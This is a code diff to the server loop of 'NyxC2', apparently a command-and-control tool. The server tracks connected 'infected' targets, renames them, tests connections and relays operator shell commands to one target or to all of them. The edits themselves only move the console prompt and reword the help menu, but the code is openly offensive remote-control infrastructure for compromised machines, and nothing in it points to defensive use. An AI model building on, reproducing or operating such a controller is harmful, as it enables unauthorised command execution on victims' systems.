@@ -10,13 +10,13 @@ def server():
     dict_ip = {}
     print("Server is ready and listening")
     print("waiting for connection")
-    print("NyxC2 > ", end="", flush=True)
     while True:
         r_sock, w_sock, x_sock = select.select(server_list, [], [])
         for elem in r_sock:
             if elem == soc:
                 (clientsocket, addressguest) = soc.accept()
                 print(f"Connection from {addressguest}")
+                print("NyxC2 > ", end="", flush=True)
                 if not clientsocket in server_list:
                     server_list.append(clientsocket)
                 if not addressguest in dict_ip:
@@ -42,7 +42,9 @@ def server():
                                 
                                 dict_ip[new_name] = dict_ip[old_name]
                                 del dict_ip[old_name]
-                            except : print("error in your command")
+                            except : 
+                                print("error in your command")
+                                print("NyxC2 > ", end="", flush=True)
                             
                         case "list":
                             for infected in dict_ip:
@@ -51,12 +53,12 @@ def server():
                             target = order.strip().split(" ")[1]
                             send_message(target + " echo i'm connected", dict_ip)
                         case "help":
-                            print("\n--- 🛠️ NyxC2 Master Commands 🛠️ ---")
+                            print("\n---  NyxC2 Master Commands  ---")
                             print("mc list               : Show all active connected targets")
                             print("mc rename <old> <new> : Rename a target's alias/IP")
                             print("mc connect <target>   : Test connection to a specific target")
                             print("mc help               : Display this help menu")
-                            print("<target|*> <command>  : Send a command to target(s) (e.g., * whoami)")
+                            print("<target|*> <command>  : Send a command to target(s). * for all targets")
                             print("------------------------------------\n")
                     
                     
@@ -75,6 +77,7 @@ def server():
                     new_data = elem.recv(4096)
                     if not new_data:
                         print(f"connection lost with {nom_cible}")
+                        print("NyxC2 > ", end="", flush=True)
                         server_list.remove(elem)
                         if nom_cible in dict_ip:
                             del dict_ip[nom_cible]
@@ -89,6 +92,7 @@ def server():
                             print("NyxC2 > ", end="", flush=True)
                 except ConnectionResetError:
                     print(f"connection brutally interrupted with {nom_cible}")
+                    print("NyxC2 > ", end="", flush=True)
                     if nom_cible in dict_ip:
                             del dict_ip[nom_cible]
                     server_list.remove(elem)
